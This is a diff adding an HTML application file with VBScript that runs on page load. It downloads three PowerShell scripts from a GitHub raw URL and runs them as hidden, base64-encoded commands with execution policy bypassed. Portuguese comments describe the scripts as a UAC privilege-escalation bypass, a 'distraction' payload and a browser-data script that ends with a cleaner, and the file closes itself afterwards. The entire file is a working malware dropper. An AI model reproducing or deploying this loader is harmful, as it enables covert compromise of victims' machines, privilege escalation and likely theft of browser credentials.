@@ -1,0 +1,73 @@
+<html>
+<head>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim shell, http, url, cmd
+
+    Set shell = CreateObject("WScript.Shell")
+    Set http = CreateObject("MSXML2.ServerXMLHTTP")
+
+    ' URL base do seu repositório
+    baseUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/"
+
+    ' 1. Baixa e executa o UAC bypass (admin)
+    url = baseUrl & "UAC-POWERSHELL-BYPASS.ps1"
+    http.Open "GET", url, False
+    http.Send
+    cmd = "powershell -NoP -W Hidden -Exec Bypass -EncodedCommand " & _
+          Base64Encode(http.responseText)
+    shell.Run cmd, 0, False
+
+    ' Aguarda um pouco
+    WScript.Sleep 3000
+
+    ' 2. Baixa e executa a distração (ANDRE)
+    url = baseUrl & "ANDRE.ps1"
+    http.Open "GET", url, False
+    http.Send
+    cmd = "powershell -NoP -W Hidden -EncodedCommand " & _
+          Base64Encode(http.responseText)
+    shell.Run cmd, 0, False
+
+    WScript.Sleep 2000
+
+    ' 3. Baixa e executa o BROWSER-ALL (já deve chamar o CLEANER no final)
+    url = baseUrl & "BROWSER-ALL.ps1"
+    http.Open "GET", url, False
+    http.Send
+    cmd = "powershell -NoP -W Hidden -EncodedCommand " & _
+          Base64Encode(http.responseText)
+    shell.Run cmd, 0, False
+
+    ' Fecha a si mesmo
+    window.Close
+End Sub
+
+' Função para codificar em Base64 (necessário para -EncodedCommand)
+Function Base64Encode(text)
+    Dim xml, doc, el
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set el = xml.CreateElement("tmp")
+    el.DataType = "bin.base64"
+    el.NodeTypedValue = Stream_StringToBinary(text)
+    Base64Encode = el.Text
+End Function
+
+Function Stream_StringToBinary(text)
+    Dim stream, writer
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 2 ' text
+    stream.Charset = "utf-16"
+    stream.Open
+    stream.WriteText text
+    stream.Flush
+    stream.Position = 0
+    stream.Type = 1 ' binary
+    Stream_StringToBinary = stream.Read
+    stream.Close
+End Function
+</script>
+</head>
+<body>
+</body>
+</html>
